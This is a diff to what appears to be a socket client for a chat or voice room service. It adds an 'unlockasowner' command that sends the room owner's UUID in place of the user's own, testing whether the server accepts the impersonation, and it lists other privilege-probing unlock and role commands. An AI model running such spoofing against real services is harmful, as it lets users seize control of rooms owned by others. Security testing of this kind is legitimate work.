@@ -747,6 +747,57 @@ function startCommandInterface() {
                     console.log(`Available: ${currentParticipantsList.map(p => p.pin_name).join(', ')}`);
                 }
             }
+        } else if (cmd === 'unlockasowner' && parts.length === 2) {
+            // Try to unlock by sending OWNER's UUID (spoofing test - will likely fail)
+            const position = parseInt(parts[1]);
+            if (!isNaN(position) && position >= 1 && position <= 10) {
+                const timestamp = new Date().toLocaleTimeString();
+                console.log(`\n${'='.repeat(80)}`);
+                console.log(`[${timestamp}] 🧪 TESTING: UUID Spoofing (send owner's UUID)`);
+                console.log(`${'='.repeat(80)}`);
+                console.log(`⚠️  WARNING: This is an impersonation attempt`);
+                console.log(`   Our UUID: ${UUID}`);
+
+                // Find room info to get owner UUID
+                fetchRooms().then(rooms => {
+                    const currentRoom = rooms.find(r => r.id === currentRoomId);
+                    if (currentRoom && currentRoom.owner) {
+                        const ownerUuid = currentRoom.owner.uuid;
+                        const ownerName = currentRoom.owner.pin_name;
+
+                        console.log(`   Owner UUID: ${ownerUuid}`);
+                        console.log(`   Owner name: ${ownerName}`);
+                        console.log(`   Trying to send unlock AS OWNER...\n`);
+
+                        const unlockData = {
+                            room: currentRoomId,
+                            uuid: ownerUuid,  // ← SPOOFED! Not our UUID!
+                            position: position - 1
+                        };
+
+                        console.log(`📤 Sending unlock_speaker with OWNER's UUID:`);
+                        console.log(`   ${JSON.stringify(unlockData, null, 2)}`);
+
+                        socket.emit('unlock_speaker', unlockData, (resp) => {
+                            console.log(`\n📥 Response: ${resp ? JSON.stringify(resp, null, 2) : 'null'}`);
+                            if (resp?.result === 200) {
+                                console.log(`\n🚨🚨🚨 SECURITY ISSUE! UUID spoofing worked!`);
+                                console.log(`Server doesn't validate socket UUID vs data UUID!`);
+                            } else if (resp?.error || resp?.result === 403) {
+                                console.log(`\n✅ SECURE: Server rejected UUID spoofing`);
+                                console.log(`Validation working correctly`);
+                            } else {
+                                console.log(`\n⚠️  No response - likely silently rejected`);
+                            }
+                            console.log(`${'='.repeat(80)}\n`);
+                        });
+                    } else {
+                        console.log(`❌ Could not find room info`);
+                    }
+                }).catch(err => {
+                    console.log(`❌ Error fetching rooms: ${err.message}`);
+                });
+            }
         } else if (cmd === 'showsession') {
             // Show current session info
             const timestamp = new Date().toLocaleTimeString();
@@ -912,16 +963,16 @@ function connectAndJoin(room, followUserUuid = null, followUserName = null) {
             console.log('Listening for new messages...\n');
             console.log('Commands:');
             console.log('  msg <text>    - Send message');
-            console.log('\n🔬 SESSION DEBUG (CRITICAL!):');
-            console.log('  showsession - Show session_id (compare owner vs non-owner!)');
-            console.log('  createroom  - Try to create room');
-            console.log('\n⭐ UNLOCK Test:');
-            console.log('  unlockwatch <1-10>  - Unlock + watch speaker_changed');
-            console.log('\n🔓 UNLOCK variants:');
-            console.log('  unlock/unlockhost/unlockadmin/unlockroom <1-10>');
-            console.log('\n🎤 Speaker:');
-            console.log('  joinspeaker <pos> / movespeaker <name> <pos>');
-            console.log('\nOther: setrole, lock, mute, quit');
+            console.log('\n🔬 SECURITY TESTS:');
+            console.log('  showsession      - Show session info');
+            console.log('  unlockasowner <pos> - Test UUID spoofing (security test)');
+            console.log('\n⭐ PRIMARY TESTS:');
+            console.log('  unlockwatch <1-10>  - Unlock + watch for confirmation');
+            console.log('  lock/unlock <1-10>  - Basic lock/unlock');
+            console.log('\n🧪 Experimental:');
+            console.log('  unlockhost/unlockadmin/unlockroom <1-10>');
+            console.log('  joinspeaker/movespeaker/setrole/rejoinhost');
+            console.log('\nOther: createroom, mute, unmute, quit');
             console.log();
 
             // Start command input handler
